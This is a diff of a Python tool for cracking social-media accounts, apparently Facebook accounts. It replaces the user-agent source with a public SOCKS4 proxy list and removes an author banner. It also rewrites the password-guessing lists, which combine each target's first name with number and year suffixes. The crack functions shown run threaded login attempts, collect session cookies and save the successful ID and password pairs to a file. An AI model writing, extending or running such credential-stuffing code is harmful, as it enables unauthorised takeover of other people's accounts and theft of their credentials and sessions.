@@ -172,16 +172,16 @@ for xd in range(10000) :
 	
 def uaku():
 	try:
-		ua=open('bbnew.txt','r').read().splitlines()
+		ua=open('porx.txt','r').read().splitlines()
 		for ub in ua:
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
+		a=requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
+		ua=open('.prox.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
 			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
+		ua=open('.porx.txt','r').read().splitlines()
 ###----------[ WARNA PRINT RICH ]---------- ###
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
@@ -811,27 +811,6 @@ def passwrd():
 　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
 　　 　　>　 　 　,)
 　　　　　∠_,,,/
-
-                             CODE BY  : shaba_shelbe
-                             Telegram : X_ula0
-                             Github   : https://t.me/shaba_shelbe
-                             Team     : shaba_shelbe
-                             Version  : V.1
- ╔╦══• •✠•❀ shaba ❀•✠ • •══╦╗
- ╚╩══• •✠•❀ hama ❀•✠ • •══╩╝
-
----------------------------------------------------------------------
- 🎀  Don't Minimize When Clonning
----------------------------------------------------------------------
-
-[+] LICENSE KEY NOT APPROVED
-[+] PREMIUM STATUS
-
-----------------------------------------------------------------------
-[+] TOOL BY shaba_shelbe   @JG_HAMAE
-[+] CLONING HAS STARTED
-[+] PROCESSING
-----------------------------------------------------------------------
 """)
 	with tred(max_workers=30) as pool:
 			for yuzong in id2:
@@ -843,31 +822,20 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+frs)
-						pwv.append(frs+''+frs)
-						pwv.append('1122334455')
-						pwv.append(frs+'1988')
-						pwv.append(frs+'1989')
-						pwv.append(frs+'1990')
-						pwv.append(frs+'1991')
-						pwv.append(frs+'1992')
-						pwv.append(frs+'1993')						
-						pwv.append(frs+'1994')						
-						pwv.append(frs+'1995')						
-						pwv.append(frs+'0750')
-						pwv.append(frs+'112233')
+						pwv.append(frs+'123')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'1234567890')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'321')
 						pwv.append(frs+'54321')
-						pwv.append('123'+frs)
-						pwv.append('1234'+frs)
-						pwv.append('12345'+frs)
-						pwv.append('123456'+frs)
+						pwv.append(frs+'2003')
+						pwv.append(frs+'2000')
+						pwv.append('123'+'123'+frs)
+						pwv.append(frs+'2002')
+						pwv.append(frs+frs+'123')						
+						pwv.append(frs+'112233')						
+						pwv.append('12345'+frs+'12345')						
+						pwv.append(frs+'1999')
+						pwv.append(frs+'1998')
+						pwv.append(frs+'1997')					
 
 				else:
 
@@ -879,31 +847,20 @@ def passwrd():
 
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+frs)
-						pwv.append(frs+''+frs)
-						pwv.append('1122334455')
-						pwv.append(frs+'1988')
-						pwv.append(frs+'1989')
-						pwv.append(frs+'1990')
-						pwv.append(frs+'1991')
-						pwv.append(frs+'1992')
-						pwv.append(frs+'1993')						
-						pwv.append(frs+'1994')						
-						pwv.append(frs+'1995')						
-						pwv.append(frs+'0750')
-						pwv.append(frs+'112233')
-						pwv.append(frs+'1234')						
+						pwv.append(frs+'123')
+						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'1234567890')
-						pwv.append(frs+'4321')
-						pwv.append(frs+'321')
 						pwv.append(frs+'54321')
-						pwv.append('123'+frs)
-						pwv.append('1234'+frs)
-						pwv.append('12345'+frs)
-						pwv.append('123456'+frs)
+						pwv.append(frs+'2003')
+						pwv.append(frs+'2000')
+						pwv.append('123'+'123'+frs)
+						pwv.append(frs+'2002')
+						pwv.append(frs+frs+'123')						
+						pwv.append(frs+'112233')						
+						pwv.append('12345'+frs+'12345')						
+						pwv.append(frs+'1999')
+						pwv.append(frs+'1998')
+						pwv.append(frs+'1997')					
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -978,7 +935,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ sᴹᴿ᭄shaba-OK ] {idf} | {pw} | {kuki}')
+				print(f'\r\x1b[1;92m [ sᴹᴿ᭄shaba-OK ] {idf} | {pw} | ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(kuki)
 				break
@@ -1035,7 +992,7 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Qᴹᴿ᭄QUTA-OK ] {idf} | {pw} | {kuki}')
+				print(f'\r\x1b[1;92m [ Qᴹᴿ᭄QUTA-OK ] {idf} | {pw} |')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(kuki)
 				break
